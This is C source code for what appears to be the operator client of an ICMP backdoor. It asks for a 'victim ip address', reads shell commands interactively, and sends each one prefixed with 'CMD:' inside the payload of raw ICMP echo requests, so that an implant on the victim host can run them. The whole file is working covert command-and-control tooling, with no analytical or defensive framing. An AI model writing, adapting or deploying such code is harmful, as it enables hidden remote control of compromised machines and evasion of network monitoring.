#include "client.h"

unsigned char ServerOpen=1;

// Calculating the Check Sum
uint16_t calculate_checksum(unsigned char* buffer, int bytes)
{
    uint32_t checksum = 0;
    unsigned char* end = buffer + bytes;

    // odd bytes add last byte and reset end
    if (bytes % 2 == 1) {
        end = buffer + bytes - 1;
        checksum += (*end) << 8;
    }

    // add words of two bytes, one by one
    while (buffer < end) {
        checksum += buffer[0] << 8;
        checksum += buffer[1];
        buffer += 2;
    }

    // add carry if any
    uint32_t carray = checksum >> 16;
    while (carray) {
        checksum = (checksum & 0xffff) + carray;
        carray = checksum >> 16;
    }

    // negate it
    checksum = ~checksum;

    return checksum & 0xffff;
}

double get_timestamp()
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec + ((double)tv.tv_usec) / 1000000;
}

int send_echo_request(int sock, struct sockaddr_in* addr, int ident, int seq,char *cmd)
{
    // allocate memory for icmp packet
    struct icmp_echo icmp;
    bzero(&icmp, sizeof(icmp));

    // fill header files
    icmp.type = 8;
    icmp.code = 0;
    icmp.ident = htons(ident);
    icmp.seq = htons(seq);

    // fill magic string
    strncpy(icmp.magic, cmd,MaxCmdLen);

    // fill sending timestamp
    icmp.sending_ts = get_timestamp();

    // calculate and fill checksum
    icmp.checksum = htons(
        calculate_checksum((unsigned char*)&icmp, sizeof(icmp))
    );

    // send it
    int bytes = sendto(sock, &icmp, sizeof(icmp), 0,(struct sockaddr*)addr, sizeof(*addr));
    if (bytes == -1) {
        DEBUG("fun:%s,sendto failed\n",__func__);
        return -1;
    }

    return 0;
}

int recv_echo_reply(int sock, int ident)
{
    // allocate buffer
    char buffer[MTU];
    struct sockaddr_in peer_addr;

    // receive another packet
    int addr_len = sizeof(peer_addr);
    int bytes = recvfrom(sock, buffer, sizeof(buffer), 0,(struct sockaddr*)&peer_addr, &addr_len);
    if (bytes == -1) {
        // normal return when timeout
        if (errno == EAGAIN || errno == EWOULDBLOCK) {
            DEBUG("fun:%s remote timeout:\n",__func__);
            return 0;
        }
        DEBUG("fun:%s errno:%d\n",__func__,errno);
        return -1;
    }

    // find icmp packet in ip packet
    struct icmp_echo* icmp = (struct icmp_echo*)(buffer + 20);

    // check type
    if (icmp->type != 0 || icmp->code != 0) {
        DEBUG("[fun: %s]: icmp type !=0 or icmp code !=0:\n",__func__);
        return 0;
    }

    // match identifier
    if (ntohs(icmp->ident) != ident) {
        DEBUG("fun:%s icmp ident not match pdi\n",__func__);
        return 0;
    }

    // print info
    printf("%s seq=%d %5.2fms\n",
        inet_ntoa(peer_addr.sin_addr),
        ntohs(icmp->seq),
        (get_timestamp() - icmp->sending_ts) * 1000
    );

    return 0;
}

// 发送ICMP请求
unsigned char Ping(char *cmd,char *ip,int sock,int seq){
     
    // for store destination address
    struct sockaddr_in addr;
    bzero(&addr, sizeof(addr));
    
    // fill address, set port to 0
    addr.sin_family = AF_INET;
    addr.sin_port = 0;
    

    if (inet_aton(ip, (struct in_addr*)&addr.sin_addr.s_addr) == 0) {
        DEBUG("[%s]:inet_aton errno\n",__func__);
        return -1;
    };
    
    int ident = getpid();
    
    int ret = send_echo_request(sock, &addr, ident, seq,cmd);
    if (ret == -1) {
        return 0;
    }

    // try to receive and print reply
    ret = recv_echo_reply(sock, ident);
    if (ret == -1) {
        return 0;
    }

    return 1;
}

// Interrupt handler
void intHandler(int dummy){
    ServerOpen=0;
}

int main(int argc,char *argv[]){
    char cmd[MaxCmdLen]={'C','M','D',':'};
    int sockfd;
    if(argc!=2){
        printf("\nFormat %s <victim ip address>\n", argv[0]);
        return 0;
    }

    signal(SIGINT, intHandler);//catching interrupt
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    if(sockfd<0){
        printf("\nSocket file descriptor not received!!\n");
        return 0;
    }
    else{
        printf("\nSocket file descriptor %d received\n", sockfd);
    } 

    // set socket timeout option
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = RECV_TIMEOUT_USEC;
    int ret = setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (ret == -1) {
        perror("first setsockopt()");
        return 0;
    }

    int seq=1;
    int cmdlen;
    // 持续发送sh 指令
    while(ServerOpen){
        printf("input sh cmd or \"Quit\" to quit:\n$ ");
        fgets(cmd+4,MaxCmdLen-4, stdin);
        // 去除末尾回车
        cmd[strnlen(cmd,MaxCmdLen)-1]=0;
        if(strncmp(cmd+4,"Quit",4)==0){
            break;
        }
        // 发送icmp包
        if(Ping(cmd,argv[1],sockfd,seq)==ICMPNORESPONSE){
            printf("Some Error Happened...");
            exit(1);
        }
        seq=(seq+1)%(1<<16);
    }
}
